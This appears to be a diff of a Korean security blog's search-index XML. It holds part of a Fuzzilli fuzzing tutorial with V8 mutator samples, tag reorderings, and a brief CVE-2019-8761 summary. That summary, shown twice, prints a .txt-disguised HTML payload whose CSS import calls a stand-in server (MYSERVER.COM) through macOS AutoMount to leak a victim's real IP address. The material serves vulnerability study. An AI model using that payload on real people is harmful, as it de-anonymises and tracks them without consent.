v2    v3 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;x&apos;    v4 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;y&apos;    v5 &lt;- <span class="hljs-type">BinaryOperation</span> v3, &apos;+&apos;, v4    v6 &lt;- <span class="hljs-type">BinaryOperation</span> v5, &apos;*&apos;, v2    <span class="hljs-type">Return</span> v6<span class="hljs-type">EndPlainFunctionDefinition</span>v7 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">0</span>&apos;v8 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1000</span>&apos;v9 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1</span>&apos;<span class="hljs-type">BeginFor</span> v7, &apos;&lt;&apos;, v8, &apos;+&apos;, v9 -&gt; v10    v11 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">42</span>&apos;    v12 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">43</span>&apos;    v13 &lt;- <span class="hljs-type">CreateObject</span> [&apos;x&apos;:v11, &apos;y&apos;:v12]    v14 &lt;- <span class="hljs-type">CallFunction</span> v0, [v13, v10]<span class="hljs-type">EndFor</span></code></pre><p>&#xC774; IL&#xCF54;&#xB4DC;&#xB97C; javascript &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">function main() { <span class="hljs-comment">//v8 code prefix</span>function v0(v1,v2) {    const v3 = v1.x;    const v4 = v1.y;    const v5 = v3 + v4;    const v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {    const v13 = {x:<span class="hljs-number">42</span>,y:<span class="hljs-number">43</span>};    const v14 = v0(v13,v10);}gc();                              <span class="hljs-comment">//</span>}                                  <span class="hljs-comment">//</span>%<span class="hljs-type">NeverOptimizeFunction</span>(main);      <span class="hljs-comment">// v8 code suffix</span>main();                            <span class="hljs-comment">//</span></code></pre><h2 id="Mutator"><a href="#Mutator" class="headerlink" title="Mutator"></a>Mutator</h2><h3 id="CodeGenMutator"><a href="#CodeGenMutator" class="headerlink" title="CodeGenMutator"></a>CodeGenMutator</h3><p>&#xAE30;&#xC874;&#xC758; &#xCF54;&#xB4DC;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; Mutation&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **v0 = v4;**        **<span class="hljs-keyword">const</span> v6 = [v0,v0,v1,v0];**        <span class="hljs-keyword">const</span> v7 = v5 * v2;        <span class="hljs-keyword">return</span> v7;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v11 = <span class="hljs-number">0</span>; v11 &lt; <span class="hljs-number">1000</span>; v11++) {        **<span class="hljs-keyword">let</span> v15 = <span class="hljs-built_in">Object</span>();        <span class="hljs-keyword">const</span> v16 = <span class="hljs-built_in">Object</span>;        <span class="hljs-keyword">const</span> v17 = v15--;**        <span class="hljs-keyword">const</span> v18 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v19 = v0(v18,v11);    }gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="InputMutator"><a href="#InputMutator" class="headerlink" title="InputMutator"></a>InputMutator</h3><p>random&#xC73C;&#xB85C; Input&#xC5D0; &#xB300;&#xD574; &#xACE8;&#xB77C;&#xC11C; &#xB2E4;&#xB978; input&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **<span class="hljs-keyword">const</span> v6 = v5 ^ v2;**        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (**<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">9007199254740992</span>;** v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    gc();    }%NeverOptimizeFunction(main);main();</code></pre><h3 id="OperationMutator"><a href="#OperationMutator" class="headerlink" title="OperationMutator"></a>OperationMutator</h3><p>Operation&#xC744; &#xD558;&#xB098; &#xACE8;&#xB77C;&#xC11C; mutate &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{    <span class="hljs-keyword">const</span> v3 = v1.x;    <span class="hljs-keyword">const</span> v4 = v1.y;    <span class="hljs-keyword">const</span> v5 = v3 + v4;    <span class="hljs-keyword">const</span> v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; **v10 = v10 &amp;&amp; <span class="hljs-number">1</span>**) {    <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">toString</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};    <span class="hljs-keyword">const</span> v14 = v0(v13,v10);}gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="CombineMutator"><a href="#CombineMutator" class="headerlink" title="CombineMutator"></a>CombineMutator</h3><p>corpus&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C; &#xC911; &#xD558;&#xB098;&#xB97C; &#xACE8;&#xB77C;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    **<span class="hljs-keyword">const</span> v11 = <span class="hljs-built_in">Object</span>();**    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v12 = <span class="hljs-number">0</span>; v12 &lt; <span class="hljs-number">1000</span>; v12++) {        <span class="hljs-keyword">const</span> v15 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v16 = v0(v15,v12);    }    gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="JITStressMutator"><a href="#JITStressMutator" class="headerlink" title="JITStressMutator"></a>JITStressMutator</h3><p>&#xC874;&#xC7AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    **<span class="hljs-keyword">const</span> v15 = <span class="hljs-built_in">Object</span>;    <span class="hljs-keyword">const</span> v17 = v0(<span class="hljs-number">1000</span>,<span class="hljs-built_in">Object</span>);**    gc();}%NeverOptimizeFunction(main);main();</code></pre><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>Fuzzilli&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xC704;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; mutator &#xC678;&#xC5D0;&#xB3C4; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; mutator&#xB97C; &#xB9CC;&#xB4E4;&#xAC70;&#xB098; &#xC0C8;&#xB85C;&#xC6B4; &#xC18D;&#xC131;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74;&#xC11C; &#xD37C;&#xC800;&#xB97C; &#xAC1C;&#xC120;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xAE30;&#xC874;&#xC758; javascript &#xD30C;&#xC77C;&#xC744; FuzzIL&#xB85C; &#xBCC0;&#xD658;&#xD574; corpus&#xB97C; &#xAD6C;&#xC131;&#xD574;&#xC8FC;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB97C; &#xC798; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xAC1C;&#xC120;&#xD55C;&#xB2E4;&#xBA74; js engine&#xC5D0; &#xB300;&#xD574; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>Research</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>fuzzing</tag>
-      
-      <tag>insu</tag>
-      
-      <tag>system</tag>
-      
-      <tag>fuzzilli</tag>
       
     </tags>
     
@@ -4735,11 +4735,42 @@
     
     <tags>
       
+      <tag>mac</tag>
+      
       <tag>zero click</tag>
+      
+      <tag>idioth</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2019-8761: MacOS txt 파일로 html 실행</title>
+    <link href="/2021/04/04/insu/2021-04-04/"/>
+    <url>/2021/04/04/insu/2021-04-04/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html">THIS MAN THOUGHT OPENING A TXT FILE IS FINE, HE THOUGHT WRONG. MACOS CVE-2019-8761</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS&#xC5D0;&#xC11C; TextEdit&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC7A5;&#xC790;&#xBA85;&#xC774; txt&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; RTF-HTML &#xD30C;&#xC77C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; txt &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2DC;&#xC791;&#xD558;&#xBA74;, txt &#xD30C;&#xC77C;&#xC784;&#xC5D0;&#xB3C4; HTML &#xD30C;&#xC2F1;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; CSS &#xC18D;&#xC131;&#xC774; &#xB85C;&#xCEEC; CSS &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;style&gt; @import { &quot;url &quot; } &lt;/stymle&gt;</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC791;&#xB3D9;&#xD558;&#xB294; scheme&#xC740; <code>file://</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC740; &#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; &#xB85C;&#xCEEC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB2E4;&#xB978; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744;  &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  OSX&#xC758; AutoMount &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ls /net/EXAMPLE.com</code>&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; OSX&#xAC00; <code>EXAMPLE.com</code>&#xC5D0; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. TextEdit&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC744; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC600;&#xC9C0;&#xB9CC; <code>file://</code> scheme&#xB97C; &#xD1B5;&#xD574; <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import{ &quot;file:///net/MYSERVER.COM/a.css&quot;} &lt;/style&gt;I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre><p>AutoMount&#xB294; &#xCEE4;&#xB110;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; TCP &#xC5F0;&#xACB0;&#xC744; &#xD558;&#xBBC0;&#xB85C; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC2E4;&#xC81C; IP &#xC8FC;&#xC18C;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>insu</tag>
+      
+      <tag>cve</tag>
       
       <tag>mac</tag>
       
-      <tag>idioth</tag>
+      <tag>information disclosure</tag>
       
     </tags>
     
@@ -4771,37 +4802,6 @@
       <tag>ghidra</tag>
       
       <tag>ghidra tutorials</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>[하루한줄] CVE-2019-8761: MacOS txt 파일로 html 실행</title>
-    <link href="/2021/04/04/insu/2021-04-04/"/>
-    <url>/2021/04/04/insu/2021-04-04/</url>
-    
-    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html">THIS MAN THOUGHT OPENING A TXT FILE IS FINE, HE THOUGHT WRONG. MACOS CVE-2019-8761</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS&#xC5D0;&#xC11C; TextEdit&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC7A5;&#xC790;&#xBA85;&#xC774; txt&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; RTF-HTML &#xD30C;&#xC77C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; txt &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2DC;&#xC791;&#xD558;&#xBA74;, txt &#xD30C;&#xC77C;&#xC784;&#xC5D0;&#xB3C4; HTML &#xD30C;&#xC2F1;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; CSS &#xC18D;&#xC131;&#xC774; &#xB85C;&#xCEEC; CSS &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;style&gt; @import { &quot;url &quot; } &lt;/stymle&gt;</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC791;&#xB3D9;&#xD558;&#xB294; scheme&#xC740; <code>file://</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC740; &#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; &#xB85C;&#xCEEC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB2E4;&#xB978; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744;  &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  OSX&#xC758; AutoMount &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ls /net/EXAMPLE.com</code>&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; OSX&#xAC00; <code>EXAMPLE.com</code>&#xC5D0; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. TextEdit&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC744; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC600;&#xC9C0;&#xB9CC; <code>file://</code> scheme&#xB97C; &#xD1B5;&#xD574; <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import{ &quot;file:///net/MYSERVER.COM/a.css&quot;} &lt;/style&gt;I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre><p>AutoMount&#xB294; &#xCEE4;&#xB110;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; TCP &#xC5F0;&#xACB0;&#xC744; &#xD558;&#xBBC0;&#xB85C; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC2E4;&#xC81C; IP &#xC8FC;&#xC18C;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>1day1line</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>cve</tag>
-      
-      <tag>information disclosure</tag>
-      
-      <tag>mac</tag>
-      
-      <tag>insu</tag>
       
     </tags>
     
@@ -4855,15 +4855,15 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>kernel</tag>
       
-      <tag>race condition</tag>
-      
       <tag>uaf</tag>
+      
+      <tag>windows</tag>
+      
+      <tag>race condition</tag>
       
       <tag>L0ch</tag>
       
@@ -4890,9 +4890,9 @@
     
     <tags>
       
-      <tag>cve</tag>
-      
       <tag>insu</tag>
+      
+      <tag>cve</tag>
       
       <tag>openssl</tag>
       
@@ -5066,11 +5066,11 @@
     
     <tags>
       
+      <tag>insu</tag>
+      
       <tag>cve</tag>
       
       <tag>mcafee</tag>
-      
-      <tag>insu</tag>
       
       <tag>html injection</tag>
       
@@ -5157,11 +5157,11 @@
     
     <tags>
       
+      <tag>uaf</tag>
+      
       <tag>microsoft</tag>
       
       <tag>use after free</tag>
-      
-      <tag>uaf</tag>
       
       <tag>internet explorer</tag>
       
@@ -5190,13 +5190,13 @@
     
     <tags>
       
-      <tag>cve</tag>
-      
-      <tag>bof</tag>
-      
       <tag>insu</tag>
       
+      <tag>cve</tag>
+      
       <tag>dd-wrt</tag>
+      
+      <tag>bof</tag>
       
     </tags>
     
@@ -5283,9 +5283,9 @@
     
     <tags>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>gnu</tag>
       
@@ -5378,11 +5378,11 @@
     
     <tags>
       
-      <tag>lpe</tag>
-      
       <tag>insu</tag>
       
       <tag>vestacp</tag>
+      
+      <tag>lpe</tag>
       
     </tags>
     
@@ -5407,9 +5407,9 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>cve</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>zdi</tag>
       
@@ -5500,13 +5500,13 @@
     
     <tags>
       
-      <tag>cve</tag>
+      <tag>insu</tag>
       
-      <tag>oob</tag>
+      <tag>cve</tag>
       
       <tag>mac</tag>
       
-      <tag>insu</tag>
+      <tag>oob</tag>
       
       <tag>coregraphics</tag>
       
@@ -5597,11 +5597,11 @@
     
     <tags>
       
+      <tag>bof</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>rce</tag>
-      
-      <tag>bof</tag>
       
     </tags>
     
@@ -5628,13 +5628,13 @@
       
       <tag>cve</tag>
       
-      <tag>kernel</tag>
+      <tag>lpe</tag>
       
       <tag>linux</tag>
       
-      <tag>heap bof</tag>
+      <tag>kernel</tag>
       
-      <tag>lpe</tag>
+      <tag>heap bof</tag>
       
       <tag>L0ch</tag>
       
@@ -5791,11 +5791,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
+      
+      <tag>windows</tag>
       
       <tag>idioth</tag>
       
@@ -6014,9 +6014,9 @@
       
       <tag>oob</tag>
       
-      <tag>rce</tag>
-      
       <tag>bof</tag>
+      
+      <tag>rce</tag>
       
       <tag>buffer overflow</tag>
       
@@ -6272,9 +6272,9 @@
     
     <tags>
       
-      <tag>malware</tag>
-      
       <tag>mac</tag>
+      
+      <tag>malware</tag>
       
       <tag>idioth</tag>
       
@@ -6530,9 +6530,9 @@
       
       <tag>cve</tag>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>linux</tag>
+      
+      <tag>Fabu1ous</tag>
       
     </tags>
     
@@ -6586,11 +6586,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
+      
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -6650,13 +6650,13 @@
       
       <tag>cve</tag>
       
+      <tag>d-link</tag>
+      
       <tag>rce</tag>
       
       <tag>router</tag>
       
       <tag>L0ch</tag>
-      
-      <tag>d-link</tag>
       
     </tags>
     
@@ -6867,9 +6867,9 @@
     
     <tags>
       
-      <tag>rce</tag>
-      
       <tag>bof</tag>
+      
+      <tag>rce</tag>
       
       <tag>buffer overflow</tag>
       
@@ -7090,11 +7090,11 @@
     
     <tags>
       
-      <tag>windows</tag>
+      <tag>lpe</tag>
       
       <tag>kernel</tag>
       
-      <tag>lpe</tag>
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -7156,11 +7156,11 @@
       
       <tag>cve</tag>
       
+      <tag>linux</tag>
+      
       <tag>eop</tag>
       
       <tag>Fabu1ous</tag>
-      
-      <tag>linux</tag>
       
       <tag>unix</tag>
       
@@ -7311,9 +7311,9 @@
       
       <tag>cve</tag>
       
-      <tag>chrome</tag>
-      
       <tag>uaf</tag>
+      
+      <tag>chrome</tag>
       
       <tag>L0ch</tag>
       
@@ -7342,11 +7342,11 @@
     
     <tags>
       
-      <tag>xss</tag>
-      
       <tag>cve</tag>
       
       <tag>microsoft</tag>
+      
+      <tag>xss</tag>
       
       <tag>idioth</tag>
       
@@ -7410,11 +7410,11 @@
       
       <tag>cve</tag>
       
-      <tag>eop</tag>
+      <tag>information disclosure</tag>
       
       <tag>kernel</tag>
       
-      <tag>information disclosure</tag>
+      <tag>eop</tag>
       
       <tag>L0ch</tag>
       
@@ -7441,9 +7441,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -7571,9 +7571,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>information disclosure</tag>
+      
+      <tag>windows</tag>
       
       <tag>idioth</tag>
       
@@ -7732,9 +7732,9 @@
     
     <tags>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>named pipe</tag>
       
@@ -7827,9 +7827,9 @@
     
     <tags>
       
-      <tag>xss</tag>
-      
       <tag>cve</tag>
+      
+      <tag>xss</tag>
       
       <tag>Fabu1ous</tag>
       
@@ -7990,9 +7990,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -8064,9 +8064,9 @@
       
       <tag>Fabu1ous</tag>
       
-      <tag>toctou</tag>
-      
       <tag>race condition</tag>
+      
+      <tag>toctou</tag>
       
     </tags>
     
@@ -8485,11 +8485,11 @@
     
     <tags>
       
+      <tag>uaf</tag>
+      
       <tag>rce</tag>
       
       <tag>javascript</tag>
-      
-      <tag>uaf</tag>
       
       <tag>L0ch</tag>
       
@@ -8582,13 +8582,13 @@
     
     <tags>
       
+      <tag>d-link</tag>
+      
       <tag>authentication bypass</tag>
       
       <tag>router</tag>
       
       <tag>L0ch</tag>
-      
-      <tag>d-link</tag>
       
       <tag>bug-door</tag>
       
@@ -8844,9 +8844,9 @@
       
       <tag>cve</tag>
       
-      <tag>lpe</tag>
-      
       <tag>information disclosure</tag>
+      
+      <tag>lpe</tag>
       
       <tag>apache</tag>
       
@@ -8877,9 +8877,9 @@
     
     <tags>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>bof</tag>
+      
+      <tag>Fabu1ous</tag>
       
